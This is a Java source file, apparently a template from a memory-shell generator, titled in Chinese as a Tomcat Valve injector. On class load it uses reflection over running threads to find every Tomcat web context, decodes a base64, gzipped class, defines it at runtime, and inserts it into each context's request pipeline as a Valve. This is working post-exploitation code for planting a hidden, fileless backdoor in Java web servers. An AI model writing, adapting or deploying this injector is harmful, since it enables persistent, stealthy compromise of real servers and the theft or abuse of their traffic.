package jmg.core.template;


import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.zip.GZIPInputStream;


/**
 * Date: 2022/11/01
 * Author: pen4uin
 * Description: Tomcat Valve 注入器
 * Tested version：
 * jdk    v1.8.0_275
 * tomcat v8.5.83, v9.0.67
 */
public class TomcatValveInjectorTpl {

    public String getUrlPattern() {
        return "/*";
    }


    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }


    static {
        new TomcatValveInjectorTpl();
    }

    public TomcatValveInjectorTpl() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object valve = getValve(context);
                if (valve == null) continue;
                injectValve(context, valve);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        Object context = null;
        try {
            for (Thread thread : threads) {
                // 适配 v5/v6/7/8
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    // 原: map.get("localhost")
                    // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
                    for (Object key : childrenMap.keySet()) {
                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
                        // 原: context = children.get("");
                        // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
                        for (Object key1 : children.keySet()) {
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext"))
                                contexts.add(context);
                            // 兼容 spring boot 2.x embedded tomcat
                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext"))
                                contexts.add(context);
                        }
                    }
                }
                // 适配 tomcat v9
                else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext"))
                        contexts.add(context);
                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext"))
                        contexts.add(context);
                }
            }
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        return contexts;
    }

    private Object getValve(Object context) {
        Object valve = null;
        ClassLoader classLoader = context.getClass().getClassLoader();
        try {
            valve = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                valve = clazz.newInstance();
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return valve;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }


    public boolean isInjected(Object context, String valveClassName) throws Exception {
        Object obj = invokeMethod(context, "getPipeline");
        Object[] valves = (Object[]) invokeMethod(obj, "getValves");
        List<Object> valvesList = Arrays.asList(valves);
        for (Object valve : valvesList) {
            if (valve.getClass().getName().contains(valveClassName)) {
                return true;
            }
        }
        return false;
    }

    public void injectValve(Object context, Object valve) throws Exception {
        if (isInjected(context, valve.getClass().getName())) {
            return;
        }
        try {
            Class ValveClass;
            try {
                ValveClass = Thread.currentThread().getContextClassLoader().loadClass("org.apache.catalina.Valve");
            } catch (Exception e) {
                ValveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
            }
            Object obj = invokeMethod(context, "getPipeline");
            // Object obj = STANDARD_CONTEXT.getClass().getMethod("getPipeline").invoke(STANDARD_CONTEXT);
            // obj.getClass().getMethod("addValve", Class.forName("org.apache.catalina.Valve")).invoke(obj,evilValve);
            invokeMethod(obj, "addValve", new Class[]{ValveClass}, new Object[]{valve});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    private static synchronized Object invokeMethod(final Object obj, final String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(obj, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}